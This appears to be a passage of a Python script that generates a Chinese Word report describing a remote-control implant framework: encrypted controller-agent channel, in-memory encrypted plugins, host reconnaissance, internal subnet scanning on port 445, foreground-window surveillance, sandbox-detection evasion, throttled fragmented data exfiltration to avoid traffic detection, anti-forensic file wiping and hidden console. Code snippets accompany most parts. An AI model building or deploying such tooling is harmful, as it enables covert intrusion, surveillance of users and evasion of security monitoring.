        '        client_sock, addr = self.server_sock.accept()\n'
        '        session_id = str(uuid.uuid4())\n'
        '\n'
        '        # 为每个连接创建独立的加密引擎\n'
        '        agent_crypto = CryptoEngine()\n'
        '        agent_crypto.generate_rsa_keypair()\n'
        '\n'
        '        with self._lock:\n'
        '            self._sessions[session_id] = {\n'
        '                "sock": client_sock,\n'
        '                "addr": addr,\n'
        '                "crypto": agent_crypto,\n'
        '            }\n'
        '\n'
        '        # 启动该连接的接收线程\n'
        '        recv_thread = threading.Thread(\n'
        '            target=self._recv_loop,\n'
        '            args=(session_id, client_sock, agent_crypto))\n'
        '        recv_thread.start()\n'
        '\n'
        '        # 发送控制端公钥给 Agent\n'
        '        self._send_public_key(session_id, client_sock, agent_crypto)'
    )

    add_para(doc, '消息接收与密钥交换处理（comm_server.py:130-187）：', bold=True)
    add_code_block(doc,
        'def _recv_loop(self, session_id, sock, crypto):\n'
        '    while self._running:\n'
        '        # 接收: 4字节长度 + JSON 消息体\n'
        '        length_data = self._recv_exact(sock, 4)\n'
        '        length = struct.unpack("!I", length_data)[0]\n'
        '        body = self._recv_exact(sock, length)\n'
        '        msg, _ = deserialize_message(length_data + body)\n'
        '\n'
        '        msg_type = msg["header"].get("type", "unknown")\n'
        '\n'
        '        # 密钥交换：加载 Agent 公钥\n'
        '        if msg_type == MSG_KEY_EXCHANGE:\n'
        '            crypto.load_rsa_public(msg["payload"])\n'
        '            continue\n'
        '\n'
        '        # 注册消息\n'
        '        if msg_type == MSG_REGISTER:\n'
        '            self._on_message(session_id, msg_type, msg["payload"])\n'
        '            continue\n'
        '\n'
        '        # 普通加密消息\n'
        '        if msg["encrypted_key"]:\n'
        '            plaintext = crypto.decrypt_message(msg)\n'
        '        else:\n'
        '            plaintext = msg["payload"]\n'
        '        self._on_message(session_id, msg_type, plaintext)'
    )

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 九、插件打包工具
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '九、插件打包工具 — pack_plugin.py', level=1)

    add_heading_styled(doc, '9.1 功能概述', level=2)
    add_para(doc, '将 .py 插件源码编译为 .pyc 字节码再 AES 加密为 .enc 文件，同时生成加密清单 __enc_manifest__。这是插件分发前的离线处理步骤。')

    add_heading_styled(doc, '9.2 打包流程', level=2)
    add_code_block(doc,
        '.py 文件\n'
        '  → py_compile.compile() 编译为 .pyc 字节码\n'
        '  → AES-GCM 加密\n'
        '  → 按 [nonce_len][nonce][tag_len][tag][ciphertext] 格式打包\n'
        '  → 写入 .enc 文件\n'
        '\n'
        '同时生成 __enc_manifest__（加密的 JSON 清单）：\n'
        '  { "plugins": {"recon": {"version":"1.0"}, ...}, "created": timestamp }'
    )

    add_heading_styled(doc, '9.3 核心代码详解', level=2)
    add_table(doc,
        ['功能', '代码位置', '说明'],
        [
            ['编译为 .pyc', 'pack_plugin.py:19-33', 'py_compile.compile() 编译，写入临时文件后读回'],
            ['加密 .pyc', 'pack_plugin.py:36-50', 'AES-GCM 加密后按 [nonce_len][nonce][tag_len][tag][ciphertext] 格式打包'],
            ['打包单个插件', 'pack_plugin.py:53-71', '编译→加密→写入 .enc 文件'],
            ['生成清单', 'pack_plugin.py:74-93', '加密的 JSON 清单记录所有已打包插件'],
            ['命令行入口', 'pack_plugin.py:98-156', '支持指定密钥/自动生成/目录批量打包'],
        ],
        col_widths=[3, 4, 8.5]
    )

    add_heading_styled(doc, '9.4 核心代码片段', level=2)
    add_para(doc, '加密 .pyc 数据（pack_plugin.py:36-50）：', bold=True)
    add_code_block(doc,
        'def encrypt_plugin(pyc_data: bytes, crypto: CryptoEngine) -> bytes:\n'
        '    """加密 .pyc 数据\n'
        '    格式: [4字节nonce长度][nonce][4字节tag长度][tag][AES-GCM密文]"""\n'
        '    nonce, ciphertext, tag = crypto.aes_encrypt(pyc_data)\n'
        '\n'
        '    parts = []\n'
        '    parts.append(struct.pack("!I", len(nonce)))\n'
        '    parts.append(nonce)\n'
        '    parts.append(struct.pack("!I", len(tag)))\n'
        '    parts.append(tag)\n'
        '    parts.append(ciphertext)\n'
        '\n'
        '    return b"".join(parts)'
    )

    add_para(doc, '使用方式：', bold=True)
    add_code_block(doc,
        '# 自动密钥\n'
        'python pack_plugin.py agent/plugins/ -o agent/plugins\n'
        '\n'
        '# 指定密钥文件\n'
        'python pack_plugin.py agent/plugins/ --key-file key.txt\n'
        '\n'
        '# 指定密钥 (hex)\n'
        'python pack_plugin.py agent/plugins/ -k 2754fd7d95bde1e4...'
    )

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 十、插件模块详解
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '十、插件模块详解', level=1)

    # 10.1 recon
    add_heading_styled(doc, '10.1 网络侦察插件 — agent/plugins/recon.py', level=2)
    add_para(doc, '功能：采集主机的网卡信息、ARP 表、DNS 缓存、网络连接，兼容中英文 Windows 系统。')
    add_table(doc,
        ['采集项', '系统命令', '解析函数', '代码位置'],
        [
            ['网卡信息', 'ipconfig /all', '_parse_interfaces()', 'recon.py:29-68'],
            ['ARP 表', 'arp -a', '_parse_arp()', 'recon.py:71-78'],
            ['DNS 缓存', 'ipconfig /displaydns', '_parse_dns_cache()', 'recon.py:99-116'],
            ['网络连接', 'netstat -ano', '_parse_netstat()', 'recon.py:82-96'],
        ],
        col_widths=[3, 3.5, 4, 5]
    )
    add_para(doc, '特点：正则解析同时匹配中英文 Windows 关键字（如 "IPv4 Address" 和 "IPv4 地址"）。')
    add_para(doc, '入口函数 run()（recon.py:119-141）返回包含所有采集结果和统计摘要的字典。')

    # 10.2 netprobe
    add_heading_styled(doc, '10.2 内网横向探测插件 — agent/plugins/netprobe.py', level=2)
    add_para(doc, '功能：多线程扫描同网段存活主机，支持 TCP 端口探测和 ICMP ping 两种方式。')
    add_table(doc,
        ['功能', '方法', '代码位置'],
        [
            ['获取本机 IP', 'UDP socket 连接 8.8.8.8 获取出口 IP', 'netprobe.py:13-21'],
            ['TCP 端口探测', 'socket.connect_ex() 探测 445 端口', 'netprobe.py:40-49'],
            ['ICMP ping', 'subprocess 调用系统 ping 命令', 'netprobe.py:25-37'],
            ['反向 DNS', 'socket.gethostbyaddr()', 'netprobe.py:52-57'],
            ['子网扫描', '50 线程并发，TCP 445 优先，失败再 ICMP', 'netprobe.py:60-115'],
            ['ARP 表提取', '解析 arp -a 命令输出', 'netprobe.py:118-138'],
        ],
        col_widths=[3, 6, 6.5]
    )
    add_para(doc, '扫描逻辑（netprobe.py:60-115）：自动检测本机 IP 确定网段，对 1-254 每个 IP 创建线程（最大 50 并发信号量控制），先 TCP 445 探测（快速），失败再 ICMP ping，存活主机做反向 DNS 解析，最终按 IP 排序返回。')

    # 10.3 winmon
    add_heading_styled(doc, '10.3 窗口信息采集插件 — agent/plugins/winmon.py', level=2)
    add_para(doc, '功能：通过 user32.dll Windows API 采集窗口信息和监控用户操作。')
    add_table(doc,
        ['功能', 'Windows API', '代码位置'],
        [
            ['获取前台窗口标题', 'GetForegroundWindow() + GetWindowTextW()', 'winmon.py:13-24'],
            ['枚举所有可见窗口', 'EnumWindows() 回调 + IsWindowVisible()', 'winmon.py:27-51'],
            ['监控窗口切换', '定时采样前台窗口，记录切换事件和持续时间', 'winmon.py:54-90'],
        ],
        col_widths=[4, 6, 5.5]
    )
    add_para(doc, '监控逻辑（winmon.py:54-90）：每 1 秒采样前台窗口标题，标题变化时记录切换事件（时间戳+窗口标题+持续时间），默认监控 60 秒。')

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 十一、Agent 工具函数
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '十一、Agent 工具函数 — agent/utils.py', level=1)
    add_table(doc,
        ['函数', '代码位置', '功能', '实现原理'],
        [
            ['is_admin()', 'utils.py:13-18', '检测管理员权限', 'ctypes.windll.shell32.IsUserAnAdmin()'],
            ['get_temp_dir()', 'utils.py:21-23', '获取临时目录', '读取 TEMP/TMP 环境变量'],
            ['secure_delete()', 'utils.py:27-44', '安全删除文件', '全零覆写后删除（防取证恢复）'],
            ['file_hash()', 'utils.py:47-53', '计算文件哈希', '分块读取计算 SHA-256'],
            ['get_system_info()', 'utils.py:56-68', '收集系统信息', 'platform 模块采集主机名/版本/架构等'],
            ['hide_console_window()', 'utils.py:71-79', '隐藏控制台窗口', 'ShowWindow(hwnd, SW_HIDE)'],
        ],
        col_widths=[4, 3, 3.5, 5]
    )

    add_heading_styled(doc, '11.1 核心代码片段', level=2)
    add_para(doc, '安全删除文件（utils.py:27-44）：', bold=True)
    add_code_block(doc,
        'def secure_delete(filepath: str):\n'
        '    """安全删除文件（覆写后删除）\n'
        '    注意：SSD 上由于 wear leveling，此方法效果有限"""\n'
        '    if not os.path.exists(filepath):\n'
        '        return\n'
        '    size = os.path.getsize(filepath)\n'
        '    with open(filepath, "wb") as f:\n'
        '        # 全零覆写\n'
        '        f.write(b"\\x00" * size)\n'
        '        f.flush()\n'
        '        os.fsync(f.fileno())\n'
        '    os.remove(filepath)'
    )

    add_para(doc, '隐藏控制台窗口（utils.py:71-79）：', bold=True)
    add_code_block(doc,
        'def hide_console_window():\n'
        '    """隐藏控制台窗口（仅 Windows）"""\n'
        '    hwnd = ctypes.windll.kernel32.GetConsoleWindow()\n'
        '    if hwnd:\n'
        '        ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE'
    )

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 十二、整体工作流程
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '十二、整体工作流程', level=1)

    add_heading_styled(doc, '12.1 完整生命周期', level=2)
    add_code_block(doc,
        '阶段 1: 开发与打包\n'
        '─────────────────────────────\n'
        '  开发插件 .py 文件\n'
        '    → pack_plugin.py 编译+加密为 .enc\n'
        '    → 生成加密清单 __enc_manifest__\n'
        '\n'
        '阶段 2: Agent 启动与环境评估\n'
        '─────────────────────────────\n'
        '  sandbox_detect.run_all_checks()\n'
        '    → 评估运行环境风险等级\n'
        '    → 决策: safe/suspicious/sandbox\n'
        '  env_perception.run()\n'
        '    → 采集系统信息、安全软件、白名单应用\n'
        '    → 构建 EnvProfile 环境画像\n'
        '\n'
        '阶段 3: 建立加密通道\n'
        '─────────────────────────────\n'
        '  Agent 连接 Controller:9999\n'
        '    → Controller 发送 RSA 公钥\n'
        '    → Agent 发送 RSA 公钥\n'
        '    → 双方各自用对方公钥加密 AES 会话密钥\n'
        '    → 后续通信全程 AES-256-GCM 加密\n'
        '\n'
        '阶段 4: 指令执行\n'
        '─────────────────────────────\n'
        '  Controller 下发指令 (CMD_EXEC/CMD_RUN_MODULE/...)\n'
        '    → Agent 通过 module_loader 动态加载加密插件\n'
        '    → 内存中解密执行，无磁盘落地\n'
        '    → 返回执行结果\n'
        '\n'
        '阶段 5: 数据回传\n'
        '─────────────────────────────\n'
        '  大数据通过 frag_transfer 分片传输\n'
        '    → 4096 字节分片，每片独立加密\n'
        '    → 片间间隔 0.1s，规避流量突发检测\n'
        '    → 接收端校验和验证+重组'
    )

    add_heading_styled(doc, '12.2 安全设计要点', level=2)
    add_table(doc,
        ['安全特性', '实现方式', '对应模块'],
        [
            ['传输加密', 'AES-256-GCM 对称加密 + RSA-2048 密钥交换', 'shared/crypto.py'],
            ['消息认证', 'GCM 模式 tag 标签验证防篡改', 'shared/crypto.py'],
            ['防重放攻击', '消息时间戳验证，默认 5 分钟过期', 'shared/crypto.py'],
            ['会话隔离', '每个 Agent 连接独立 CryptoEngine 实例', 'controller/comm_server.py'],
            ['无磁盘落地', '加密插件内存解密执行，模块 __file__ 标记为 <encrypted:xxx>', 'agent/module_loader.py'],
            ['沙箱规避', '11 项检测，加权评分判定环境风险', 'agent/sandbox_detect.py'],
            ['流量规避', '分片传输+片间延迟，规避单包大小和流量突发检测', 'agent/frag_transfer.py'],
            ['痕迹清除', '安全删除（全零覆写+删除）', 'agent/utils.py'],
            ['窗口隐藏', 'ShowWindow(SW_HIDE) 隐藏控制台', 'agent/utils.py'],
        ],
        col_widths=[3, 7.5, 5]
    )

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 十三、依赖说明
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '十三、依赖说明', level=1)

    add_table(doc,
        ['包名', '版本要求', '用途', '平台限制'],
        [
            ['pycryptodome', '>=3.20.0', 'AES-256-GCM / RSA-2048 加密', '全平台'],
            ['pywin32', '>=306', 'Windows API 访问 (ctypes 扩展)', '仅 Windows'],
            ['wmi', '>=1.5.1', 'WMI 系统信息查询', '仅 Windows'],
            ['scapy', '>=2.5.0', '网络包处理（预留扩展）', '全平台'],
            ['python-docx', '>=1.0', '文档生成（本报告使用）', '全平台'],
        ],
        col_widths=[3.5, 3, 5.5, 3.5]
    )

    add_heading_styled(doc, '13.1 安装命令', level=2)
    add_code_block(doc,
        '# 创建虚拟环境\n'
        'python -m venv .venv\n'
        '\n'
        '# 安装依赖\n'
        '.venv\\Scripts\\pip install -r requirements.txt\n'
        '\n'
        '# 或使用清华镜像加速\n'
        '.venv\\Scripts\\pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple'
    )

    # ── 保存 ──
    output_path = '项目功能与核心代码分析.docx'
    doc.save(output_path)
    print(f'[+] 文档已生成: {output_path}')


if __name__ == '__main__':
    generate_document()
